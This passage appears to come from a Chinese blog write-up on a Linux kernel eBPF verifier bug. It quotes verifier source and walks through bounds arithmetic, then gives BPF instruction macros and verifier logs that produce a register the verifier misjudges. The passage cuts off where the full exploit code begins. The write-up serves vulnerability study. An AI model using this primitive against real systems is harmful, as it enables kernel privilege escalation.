class="line">reg-&gt;smax_value = (s64)imm;</span><br><span class="line">reg-&gt;umin_value = imm;</span><br><span class="line">reg-&gt;umax_value = imm;</span><br><span class="line"></span><br><span class="line">reg-&gt;s32_min_value = (s32)imm;</span><br><span class="line">reg-&gt;s32_max_value = (s32)imm;</span><br><span class="line">reg-&gt;u32_min_value = (u32)imm;</span><br><span class="line">reg-&gt;u32_max_value = (u32)imm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark the unknown part of a register (variable offset or scalar value) as</span></span><br><span class="line"><span class="comment"> * known to have the value @imm.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* Clear id, off, and union(map_ptr, range) */</span></span><br><span class="line"><span class="built_in">memset</span>(((u8 *)reg) + <span class="keyword">sizeof</span>(reg-&gt;type), <span class="number">0</span>,</span><br><span class="line">       offsetof(struct bpf_reg_state, var_off) - <span class="keyword">sizeof</span>(reg-&gt;type));</span><br><span class="line">___mark_reg_known(reg, imm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_reg_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="params"><span class="function">   struct bpf_insn *insn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">off_reg.type = SCALAR_VALUE;</span><br><span class="line">__mark_reg_known(&amp;off_reg, insn-&gt;imm);</span><br><span class="line">src_reg = &amp;off_reg;</span><br><span class="line"><span class="keyword">if</span> (ptr_reg) <span class="comment">/* pointer += K */</span></span><br><span class="line">  <span class="keyword">return</span> adjust_ptr_min_max_vals(env, insn,</span><br><span class="line">                                 ptr_reg, src_reg);</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码就是给<code>src_reg</code>进行了初始化，可以看到其有符号无符号最大值最小值都被赋值为了1。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__update_reg_bounds(dst_reg);</span><br><span class="line">__reg_deduce_bounds(dst_reg);</span><br><span class="line">__reg_bound_offset(dst_reg);</span><br></pre></td></tr></table></figure><p>并且在<code>adjust_scalar_min_max_vals</code>函数的末尾会进行如下操作，首先又会执行<code>__update_reg_bounds</code>函数更新一下边界值，计算一下会发现其实结果并不会改变。不过如果此时我们再次构造一个最小边界值为0，最大边界值为1，并且运行时值为0的寄存器，再让两个寄存器相加。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar32_min_max_add</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">s32 smin_val = src_reg-&gt;s32_min_value;</span><br><span class="line">s32 smax_val = src_reg-&gt;s32_max_value;</span><br><span class="line">u32 umin_val = src_reg-&gt;u32_min_value;</span><br><span class="line">u32 umax_val = src_reg-&gt;u32_max_value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (signed_add32_overflows(dst_reg-&gt;s32_min_value, smin_val) ||</span><br><span class="line">    signed_add32_overflows(dst_reg-&gt;s32_max_value, smax_val)) &#123;</span><br><span class="line">dst_reg-&gt;s32_min_value = S32_MIN;</span><br><span class="line">dst_reg-&gt;s32_max_value = S32_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">dst_reg-&gt;s32_min_value += smin_val;</span><br><span class="line">dst_reg-&gt;s32_max_value += smax_val;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (dst_reg-&gt;u32_min_value + umin_val &lt; umin_val ||</span><br><span class="line">    dst_reg-&gt;u32_max_value + umax_val &lt; umax_val) &#123;</span><br><span class="line">dst_reg-&gt;u32_min_value = <span class="number">0</span>;</span><br><span class="line">dst_reg-&gt;u32_max_value = U32_MAX;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">dst_reg-&gt;u32_min_value += umin_val;</span><br><span class="line">dst_reg-&gt;u32_max_value += umax_val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则会进入这样一个函数中，计算一下便会发现不会出现<code>overflow</code>的情况，所以走的都是else，那么在相加之后<code>dst_reg</code>的最大边界值和最小边界值都为1了。此时回到<code>adjust_scalar_min_max_vals</code>函数时又会调用<code>__reg_bound_offset</code>函数，然而经过计算可以得到的是他会将寄存器的值改为1，那么此时我们就算成功获得了一个在运行时寄存器的值为0但是在<code>verifier</code>中认定其值为1的寄存器了。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>不难看出来目前的情况就很类似d3bpf了，不过稍有不同的是这里运行时和<code>verifier</code>中的值和题目中的正好相反，不过想要构造成一摸一样的也是很简单的，<code>(reg + 1) &amp; 1</code>即可构造出一摸一样的情况的了。</p><p>首先通过上述办法构造出最小边界值为1，最大边界值为0的寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(map_fd)                                                       \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_9, 0xffffffff),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_9, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_9),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">19</span>: (<span class="number">5f</span>) r6 &amp;= r7</span><br><span class="line"><span class="number">20</span>: R0_w=invP0 R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span>m</span><br></pre></td></tr></table></figure><p>最终根据前面的理论可以得到一下内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(map_fd)                                                       \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, map_fd),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),                               \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_9, 0xffffffff),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_9, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_9),                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_7, 0x1),                                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_LSH, BPF_REG_7, 32),                               \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 2),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_AND, BPF_REG_6, BPF_REG_7),                        \</span></span><br><span class="line"><span class="meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_8, 0),                        \</span></span><br><span class="line"><span class="meta">        BPF_JMP32_IMM(BPF_JLE, BPF_REG_3, 1, 2),                             \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0x196082),                                  \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_3),                        \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0x1),                              \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_AND, BPF_REG_6, 0x1)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span>: (<span class="number">79</span>) r3 = *(u64 *)(r8 +<span class="number">0</span>)</span><br><span class="line"> R0_w=invP0 R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R1=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">21</span>: R0_w=invP0 R3_w=invP(id=<span class="number">0</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_winvP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">21</span>: (b6) <span class="keyword">if</span> w3 &lt;= <span class="number">0x1</span> <span class="keyword">goto</span> pc+<span class="number">2</span> R0_w=invP0 R3_w=invP(id=<span class="number">0</span>,u32_min_value=<span class="number">2</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">537</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">22</span>: R0_w=invP0 R3_w=invP(id=<span class="number">0</span>,u32_min_value=<span class="number">2</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">22</span>: (b7) r0 = <span class="number">1663106</span></span><br><span class="line"><span class="number">23</span>: R0_w=invP1663106 R3_w=invP(id=<span class="number">0</span>,u32_min_value=<span class="number">2</span>) R6_w=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x100000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7_w=invP4294967298 R8_w=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ksm4,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9_w=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">23</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br><span class="line"><span class="number">24</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>)R6=invP(id=<span class="number">0</span>,umax_value=<span class="number">4294967296</span>,var_off=(<span class="number">0x0</span>; <span class="number">0x10000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">0</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">0</span>) R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">24</span>: (<span class="number">0f</span>) r6 += r3</span><br><span class="line"><span class="number">25</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>)R6_w=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">1446744069414584321</span>,var_off=(<span class="number">0x1</span>; <span class="number">0xffffffff00000000</span>),s32_min_value=<span class="number">1</span>,s32_max_value=<span class="number">1</span>,u32_min_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">25</span>: (<span class="number">07</span>) r6 += <span class="number">1</span></span><br><span class="line"><span class="number">26</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R6_w=invP(id=<span class="number">0</span>,smin_value=<span class="number">-9223372036854775806</span>,smax_value=<span class="number">223372032559808514</span>,umin_value=<span class="number">2</span>,umax_value=<span class="number">18446744069414584322</span>,var_off=(<span class="number">0x2</span>; <span class="number">0xffffffff00000000</span>),s32_min_value=<span class="number">2</span>,s32_max_value=<span class="number">2</span>,u32_max_value=<span class="number">2</span>) R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,vs=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R1</span><br><span class="line"><span class="number">26</span>: (<span class="number">57</span>) r6 &amp;= <span class="number">1</span></span><br><span class="line"><span class="number">27</span>: R0=invP0 R3=invP(id=<span class="number">0</span>,smax_value=<span class="number">9223372032559808513</span>,umax_value=<span class="number">18446744069414584321</span>,var_off=(<span class="number">0x0</span>; <span class="number">0xffffffff00000001</span>),s32_min_value=<span class="number">0</span>,s32_max_value=<span class="number">1</span>,u32_max_value=<span class="number">1</span>) R6_w=invP0 R7=invP4294967298 R8=map_value(id=<span class="number">0</span>,off=<span class="number">0</span>,ks=<span class="number">4</span>,s=<span class="number">5376</span>,imm=<span class="number">0</span>) R9=invP<span class="number">-4294967296</span> R10=fp0 fp<span class="number">-8</span>=<span class="number">0000</span></span><br><span class="line"><span class="number">27</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p>这里稍微提一嘴就是这里是如何使R3达到高32位为<code>unknown</code>，低32为<code>known</code>的效果，其实也很容易想明白，这里进行了<code>unsigned</code>的小于等于的判断，所以可以确定低32位的值，不过因为是<code>&lt;= 1</code>所以最后一位也是无法确定的，所以最终<code>.mask = 0xffffffff00000001</code>，当然直接<code>AND 0xffffffff00000001</code>应该也是可以的。</p><p>此时因为通过边界值修复了R6寄存器的<code>var_off</code>为1，但是运行时依旧为0所以此时只需要将<code>R6 + 1</code>随后<code>AND 1</code>那么在<code>verifier</code>是就会显示R6为0了，至此得到了一个运行时为1，<code>verifier</code>为0的寄存器了。</p><h3 id="综上，可得exp"><a href="#综上，可得exp" class="headerlink" title="综上，可得exp"></a>综上，可得exp</h3><p>具体利用方法和d3bpf一致，这里不再赘述，有需要可以去看 <a href="https://cv196082.gitee.io/2023/01/06/d3bpf/">https://cv196082.gitee.io/2023/01/06/d3bpf/</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span 